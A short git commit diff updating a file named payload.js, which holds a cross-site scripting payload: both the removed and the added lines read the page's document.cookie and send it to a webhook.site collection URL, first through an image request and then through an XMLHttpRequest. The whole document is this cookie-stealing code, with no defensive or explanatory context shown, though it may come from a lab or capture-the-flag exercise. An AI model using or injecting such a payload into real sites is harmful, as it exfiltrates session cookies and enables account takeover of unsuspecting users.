f6dc6f934d451bfec9e0ee13c36e0c4500a1f99d
Marcos <75510647+marcosrmartin@users.noreply.github.com>
2022-11-13 01:34:15 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,3 @@
-var i=new Image;
-i.src="https://webhook.site/00320ddb-86c7-449b-9dce-279e51235af9?\"+document.cookie";
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/00320ddb-86c7-449b-9dce-279e51235af9/?' + document.cookie, true);
+xhttp.send();
